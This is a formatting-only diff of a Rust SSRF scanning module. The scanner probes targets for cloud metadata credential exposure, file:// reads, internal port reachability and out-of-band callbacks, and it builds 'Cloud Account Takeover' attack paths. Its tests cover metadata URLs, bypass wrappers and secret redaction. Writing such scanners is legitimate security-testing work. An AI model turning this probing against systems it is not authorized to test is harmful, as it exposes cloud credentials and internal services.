@@ -2059,7 +2357,11 @@ fn attack_paths(p: &Posture, target: &str) -> Vec<Value> {
 }
 
 fn posture_summary(p: &Posture, target: &str, requests: usize, settings: &Settings) -> Value {
-    let score = if settings.posture_scoring { p.score.clamp(0.0, 1.0) } else { 0.0 };
+    let score = if settings.posture_scoring {
+        p.score.clamp(0.0, 1.0)
+    } else {
+        0.0
+    };
     let grade = if !settings.posture_scoring || p.confirmed == 0 {
         "info"
     } else {
@@ -2088,16 +2390,25 @@ fn posture_summary(p: &Posture, target: &str, requests: usize, settings: &Settin
         .with("exposure_score", json!((score * 100.0).round() as i64))
         .with("confirmed_findings", i64::from(p.confirmed))
         .with("probes_issued", requests as i64)
-        .with("severity_breakdown", json!({"critical": crit, "high": high, "medium": med, "low": low}))
-        .with("cloud_providers", json!(p.providers.iter().cloned().collect::<Vec<_>>()))
+        .with(
+            "severity_breakdown",
+            json!({"critical": crit, "high": high, "medium": med, "low": low}),
+        )
+        .with(
+            "cloud_providers",
+            json!(p.providers.iter().cloned().collect::<Vec<_>>()),
+        )
         .with("scan_depth", i64::from(settings.depth))
-        .with("signals", json!({
-            "metadata_credentials": p.metadata_confirmed,
-            "file_read": p.file_read,
-            "internal_service": p.internal_service,
-            "open_redirect": p.open_redirect,
-            "oob_planted": p.oob_planted,
-        }))
+        .with(
+            "signals",
+            json!({
+                "metadata_credentials": p.metadata_confirmed,
+                "file_read": p.file_read,
+                "internal_service": p.internal_service,
+                "open_redirect": p.open_redirect,
+                "oob_planted": p.oob_planted,
+            }),
+        )
         .with("crown_jewels", json!(p.crown_jewels.clone()));
 
     let mut f = finding_rich(
@@ -2112,7 +2423,10 @@ fn posture_summary(p: &Posture, target: &str, requests: usize, settings: &Settin
     );
     if let Some(o) = f.as_object_mut() {
         o.insert("finding_kind".into(), json!("posture_summary"));
-        o.insert("exposure_score".into(), json!((score * 100.0).round() as i64));
+        o.insert(
+            "exposure_score".into(),
+            json!((score * 100.0).round() as i64),
+        );
     }
     f
 }
@@ -2157,8 +2471,10 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                 let resp = if headers.is_empty() {
                     http_get(&client, &url).await
                 } else {
-                    let h: Vec<(&str, &str)> =
-                        headers.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
+                    let h: Vec<(&str, &str)> = headers
+                        .iter()
+                        .map(|(k, v)| (k.as_str(), v.as_str()))
+                        .collect();
                     http_get_with_headers(&client, &url, &h).await
                 };
                 (i, resp)
@@ -2186,7 +2502,8 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                         || p.body.contains("Unauthorized")
                         || matches!(p.status, 401 | 403))
                 {
-                    let title = "SSRF reaches AWS IMDSv2 token endpoint (metadata plane exposed)".to_string();
+                    let title = "SSRF reaches AWS IMDSv2 token endpoint (metadata plane exposed)"
+                        .to_string();
                     if seen_titles.insert(title.clone()) {
                         posture.record("high", &title);
                         posture.imdsv2_reachable = true;
@@ -2195,7 +2512,11 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                             .with("injection_point", probe.point_label.clone())
                             .with("payload", probe.payload.clone())
                             .with("http_status", i64::from(p.status))
-                            .check("imdsv2_token_endpoint_reachable", true, format!("HTTP {} with IMDSv2 enforcement signal", p.status))
+                            .check(
+                                "imdsv2_token_endpoint_reachable",
+                                true,
+                                format!("HTTP {} with IMDSv2 enforcement signal", p.status),
+                            )
                             .raw_excerpt(p.body.as_bytes());
                         findings.push(mk_finding(
                             &title,
@@ -2226,7 +2547,11 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                     let title = if is_file {
                         format!("SSRF file:// Local File Read via {}", probe.point_label)
                     } else {
-                        format!("SSRF → {} Metadata Credential Exposure via {}", probe.provider.to_uppercase(), probe.point_label)
+                        format!(
+                            "SSRF → {} Metadata Credential Exposure via {}",
+                            probe.provider.to_uppercase(),
+                            probe.point_label
+                        )
                     };
                     if !seen_titles.insert(title.clone()) {
                         continue;
@@ -2236,7 +2561,9 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                         posture.file_read = true;
                     } else {
                         posture.metadata_confirmed = true;
-                        posture.providers.insert(provider_base(probe.provider).to_string());
+                        posture
+                            .providers
+                            .insert(provider_base(probe.provider).to_string());
                     }
                     if capable_param.is_none() {
                         capable_param = param_name(&probe.point_label);
@@ -2253,9 +2580,11 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                         .check("canary_in_response", true, format!("matched '{hit}'"))
                         .raw_excerpt(p.body.as_bytes());
                     if !leaked.is_empty() {
-                        ev = ev
-                            .with("leaked_material", json!(leaked.clone()))
-                            .check("secret_material_leaked", true, leaked.join(", "));
+                        ev = ev.with("leaked_material", json!(leaked.clone())).check(
+                            "secret_material_leaked",
+                            true,
+                            leaked.join(", "),
+                        );
                     }
                     findings.push(mk_finding(
                         &title,
@@ -2305,7 +2634,10 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                     && (p.status != baseline.status || delta > 256)
                     && !looks_like_reflection(&p.body, &probe.payload);
                 if differential {
-                    let title = format!("SSRF: differential server-side fetch via {}", probe.point_label);
+                    let title = format!(
+                        "SSRF: differential server-side fetch via {}",
+                        probe.point_label
+                    );
                     if !seen_titles.insert(title.clone()) {
                         continue;
                     }
@@ -2320,8 +2652,19 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                         .with("http_status", i64::from(p.status))
                         .with("baseline_status", i64::from(baseline.status))
                         .with("body_delta_bytes", delta as i64)
-                        .check("status_or_size_differential", true, format!("HTTP {} vs baseline {} (Δ{} B)", p.status, baseline.status, delta))
-                        .check("not_reflection", true, "payload not echoed in the response body");
+                        .check(
+                            "status_or_size_differential",
+                            true,
+                            format!(
+                                "HTTP {} vs baseline {} (Δ{} B)",
+                                p.status, baseline.status, delta
+                            ),
+                        )
+                        .check(
+                            "not_reflection",
+                            true,
+                            "payload not echoed in the response body",
+                        );
                     findings.push(mk_finding(
                         &title,
                         "high",
@@ -2381,7 +2724,10 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
                     posture.record("info", &title);
                     let ev = Evidence::new()
                         .with("payload", probe.payload.clone())
-                        .with("interaction_domain", settings.oast_domain.clone().unwrap_or_default())
+                        .with(
+                            "interaction_domain",
+                            settings.oast_domain.clone().unwrap_or_default(),
+                        )
                         .check("oob_payload_planted", true, probe.payload.clone());
                     findings.push(mk_finding(
                         &title,
@@ -2407,8 +2753,16 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
     if settings.internal_port_scan {
         // `capable_param` already holds the extracted parameter name (e.g. "url").
         if let Some(param) = capable_param.clone() {
-            let ip_findings =
-                phase_internal_ports(&client, &settings, &points, &param, &baseline, &host, &mut posture).await;
+            let ip_findings = phase_internal_ports(
+                &client,
+                &settings,
+                &points,
+                &param,
+                &baseline,
+                &host,
+                &mut posture,
+            )
+            .await;
             extra_requests += settings.internal_ports.len() + settings.internal_hosts.len();
             findings.extend(ip_findings);
         }
@@ -2416,28 +2770,56 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
 
     // POST/JSON body-based SSRF (webhook / URL-preview / PDF-render sinks).
     if settings.test_body {
-        let (body_findings, n) =
-            phase_body_injection(&client, &settings, &points, &host, &mut posture, &mut seen_titles).await;
+        let (body_findings, n) = phase_body_injection(
+            &client,
+            &settings,
+            &points,
+            &host,
+            &mut posture,
+            &mut seen_titles,
+        )
+        .await;
         extra_requests += n;
         findings.extend(body_findings);
         if settings.depth >= 3 {
-            let (xml_findings, n2) =
-                phase_xml_body_injection(&client, &settings, &points, &host, &mut posture, &mut seen_titles).await;
+            let (xml_findings, n2) = phase_xml_body_injection(
+                &client,
+                &settings,
+                &points,
+                &host,
+                &mut posture,
+                &mut seen_titles,
+            )
+            .await;
             extra_requests += n2;
             findings.extend(xml_findings);
         }
     }
 
     if settings.test_multipart {
-        let (mp_findings, n) =
-            phase_multipart_injection(&client, &settings, &points, &host, &mut posture, &mut seen_titles).await;
+        let (mp_findings, n) = phase_multipart_injection(
+            &client,
+            &settings,
+            &points,
+            &host,
+            &mut posture,
+            &mut seen_titles,
+        )
+        .await;
         extra_requests += n;
         findings.extend(mp_findings);
     }
 
     if settings.test_graphql {
-        let (gql_findings, n) =
-            phase_graphql_injection(&client, &settings, &base, &host, &mut posture, &mut seen_titles).await;
+        let (gql_findings, n) = phase_graphql_injection(
+            &client,
+            &settings,
+            &base,
+            &host,
+            &mut posture,
+            &mut seen_titles,
+        )
+        .await;
         extra_requests += n;
         findings.extend(gql_findings);
     }
@@ -2459,7 +2841,8 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
     // Time-based blind SSRF oracle (no OAST required) — only when nothing was already confirmed
     // in-band, to keep the scan lean and avoid redundant latency probing.
     if settings.timing_oracle && !posture.metadata_confirmed && !posture.arbitrary_fetch {
-        let (timing_findings, n) = phase_timing_oracle(&settings, &points, &host, &mut posture).await;
+        let (timing_findings, n) =
+            phase_timing_oracle(&settings, &points, &host, &mut posture).await;
         extra_requests += n;
         findings.extend(timing_findings);
     }
@@ -2467,16 +2850,26 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
     // Synthesized attack paths (operator-toggleable), then the always-present posture summary.
     let mut out: Vec<Value> = findings
         .into_iter()
-        .filter(|f| sev_rank(f.get("severity").and_then(Value::as_str).unwrap_or("info")) >= settings.min_sev_rank)
+        .filter(|f| {
+            sev_rank(f.get("severity").and_then(Value::as_str).unwrap_or("info"))
+                >= settings.min_sev_rank
+        })
         .collect();
     if settings.attack_synth {
         for ap in attack_paths(&posture, &host) {
-            if sev_rank(ap.get("severity").and_then(Value::as_str).unwrap_or("info")) >= settings.min_sev_rank {
+            if sev_rank(ap.get("severity").and_then(Value::as_str).unwrap_or("info"))
+                >= settings.min_sev_rank
+            {
                 out.push(ap);
             }
         }
     }
-    out.push(posture_summary(&posture, &host, total_probes + extra_requests, &settings));
+    out.push(posture_summary(
+        &posture,
+        &host,
+        total_probes + extra_requests,
+        &settings,
+    ));
 
     let confirmed = posture.confirmed;
     EngineResult::ok(
@@ -2487,7 +2880,11 @@ pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) 
             host,
             total_probes + extra_requests,
             settings.depth,
-            if posture.metadata_confirmed { ", METADATA CREDS EXPOSED" } else { "" }
+            if posture.metadata_confirmed {
+                ", METADATA CREDS EXPOSED"
+            } else {
+                ""
+            }
         ),
     )
 }
@@ -2539,27 +2936,51 @@ mod tests {
         let m = metadata_corpus();
         assert!(m.len() >= 15, "corpus should be comprehensive");
         let providers: BTreeSet<&str> = m.iter().map(|t| provider_base(t.provider)).collect();
-        for want in ["aws", "gcp", "azure", "alibaba", "oracle", "digitalocean", "kubernetes"] {
+        for want in [
+            "aws",
+            "gcp",
+            "azure",
+            "alibaba",
+            "oracle",
+            "digitalocean",
+            "kubernetes",
+        ] {
             assert!(providers.contains(want), "missing provider: {want}");
         }
         for t in m {
-            assert!(!t.canaries.is_empty(), "every target needs canaries: {}", t.url);
+            assert!(
+                !t.canaries.is_empty(),
+                "every target needs canaries: {}",
+                t.url
+            );
             assert!(matches!(t.min_depth, 1..=4));
         }
     }
 
     #[test]
     fn add_query_handles_existing_query() {
-        assert_eq!(add_query("https://x.test", "url", "http://a"), "https://x.test?url=http%3A%2F%2Fa");
+        assert_eq!(
+            add_query("https://x.test", "url", "http://a"),
+            "https://x.test?url=http%3A%2F%2Fa"
+        );
         assert!(add_query("https://x.test?a=1", "url", "b").starts_with("https://x.test?a=1&url="));
     }
 
     #[test]
     fn canary_and_reflection_detection() {
-        assert_eq!(canary_hit("...AccessKeyId: AKIA...", &["AccessKeyId"]), Some("AccessKeyId"));
+        assert_eq!(
+            canary_hit("...AccessKeyId: AKIA...", &["AccessKeyId"]),
+            Some("AccessKeyId")
+        );
         assert!(canary_hit("nothing", &["AccessKeyId"]).is_none());
-        assert!(looks_like_reflection("you sent http://169.254.169.254/x", "http://169.254.169.254/x"));
-        assert!(!looks_like_reflection("totally different page", "http://169.254.169.254/x"));
+        assert!(looks_like_reflection(
+            "you sent http://169.254.169.254/x",
+            "http://169.254.169.254/x"
+        ));
+        assert!(!looks_like_reflection(
+            "totally different page",
+            "http://169.254.169.254/x"
+        ));
     }
 
     #[test]
@@ -2571,7 +2992,10 @@ mod tests {
     #[test]
     fn param_name_extraction() {
         assert_eq!(param_name("param 'url'").as_deref(), Some("url"));
-        assert_eq!(param_name("header 'X-Forwarded-For'").as_deref(), Some("X-Forwarded-For"));
+        assert_eq!(
+            param_name("header 'X-Forwarded-For'").as_deref(),
+            Some("X-Forwarded-For")
+        );
         assert_eq!(param_name("no quotes"), None);
     }
 
@@ -2591,7 +3015,9 @@ mod tests {
 
     #[test]
     fn build_work_respects_depth_and_budget() {
-        let light = parse_settings(&cfg(json!({"intensity": "light", "open_redirect": false, "test_headers": false})));
+        let light = parse_settings(&cfg(
+            json!({"intensity": "light", "open_redirect": false, "test_headers": false}),
+        ));
         let pts = injection_points("https://x.test", &[]);
         let w = build_work(&light, &pts);
         assert!(!w.is_empty());
@@ -2604,10 +3030,13 @@ mod tests {
 
     #[test]
     fn iam_role_parsing_is_sanitised() {
-        assert_eq!(parse_iam_roles("WebServerRole\n"), vec!["WebServerRole".to_string()]);
+        assert_eq!(
+            parse_iam_roles("WebServerRole\n"),
+            vec!["WebServerRole".to_string()]
+        );
         let multi = parse_iam_roles("RoleA\nRoleB\nRoleC\nRoleD");
         assert_eq!(multi.len(), 3); // bounded to 3
-        // Rejects HTML / spaces (soft-404 pages must not be treated as role names).
+                                    // Rejects HTML / spaces (soft-404 pages must not be treated as role names).
         assert!(parse_iam_roles("<html>not found</html>").is_empty());
         assert!(parse_iam_roles("role with spaces").is_empty());
     }
@@ -2616,13 +3045,17 @@ mod tests {
     fn secret_redaction_never_leaks_full_secret() {
         let body = r#"{"Code":"Success","AccessKeyId":"ASIAEXAMPLEKEY12345","SecretAccessKey":"abc/def+ghi","Token":"AAA"}"#;
         let r = redact_secrets(body);
-        assert!(r.iter().any(|s| s.contains("ASIA") && s.contains("redacted")));
+        assert!(r
+            .iter()
+            .any(|s| s.contains("ASIA") && s.contains("redacted")));
         assert!(r.iter().any(|s| s.contains("secret access key")));
         // The raw secret value must never appear in the redacted descriptors.
         assert!(!r.iter().any(|s| s.contains("abc/def+ghi")));
         assert!(redact_secrets("just a normal page").is_empty());
 
-        let tok = redact_secrets(r#"{"access_token":"ya29.aVeryLongOauthTokenValue123456","expires_in":3599}"#);
+        let tok = redact_secrets(
+            r#"{"access_token":"ya29.aVeryLongOauthTokenValue123456","expires_in":3599}"#,
+        );
         assert!(tok.iter().any(|s| s.contains("access_token")));
     }
 
@@ -2633,7 +3066,9 @@ mod tests {
         assert!(v.len() >= 4, "expected multiple bypass wrappers");
         assert!(v.iter().any(|(u, _)| u.contains('@')));
         assert!(v.iter().any(|(u, _)| u.contains('#')));
-        assert!(v.iter().any(|(u, _)| u.contains("%2e") || u.contains("169.254.169.254")));
+        assert!(v
+            .iter()
+            .any(|(u, _)| u.contains("%2e") || u.contains("169.254.169.254")));
     }
 
     #[test]
@@ -2646,7 +3081,10 @@ mod tests {
     #[test]
     fn sink_paths_auto_appended_at_depth_2() {
         let s = parse_settings(&cfg(json!({"intensity": "normal"})));
-        assert!(s.extra_points.iter().any(|p| p.contains("/api/fetch") || p.contains("/proxy")));
+        assert!(s
+            .extra_points
+            .iter()
+            .any(|p| p.contains("/api/fetch") || p.contains("/proxy")));
     }
 
     #[test]
@@ -2656,7 +3094,10 @@ mod tests {
         p.metadata_confirmed = true;
         p.providers.insert("aws".into());
         let aps = attack_paths(&p, "x.test");
-        assert!(aps.iter().any(|f| f["title"].as_str().unwrap_or("").contains("Cloud Account Takeover")));
+        assert!(aps.iter().any(|f| f["title"]
+            .as_str()
+            .unwrap_or("")
+            .contains("Cloud Account Takeover")));
     }
 
     #[test]
@@ -2668,14 +3109,20 @@ mod tests {
         let jenkins = "<html><title>Dashboard [Jenkins]</title></html>";
         assert!(classify_internal_service(jenkins, "http://127.0.0.1:8080/").is_some());
 
-        assert!(classify_internal_service("<html>generic page</html>", "http://127.0.0.1:9999/").is_none());
+        assert!(
+            classify_internal_service("<html>generic page</html>", "http://127.0.0.1:9999/")
+                .is_none()
+        );
     }
 
     #[test]
     fn parse_ecs_credential_paths_handles_json_and_lines() {
         assert_eq!(
             parse_ecs_credential_paths(r#"["/v2/credentials/abc-123","/v2/credentials/def"]"#),
-            vec!["/v2/credentials/abc-123".to_string(), "/v2/credentials/def".to_string()]
+            vec![
+                "/v2/credentials/abc-123".to_string(),
+                "/v2/credentials/def".to_string()
+            ]
         );
         assert_eq!(
             parse_ecs_credential_paths("task-role-1\ntask-role-2\n"),
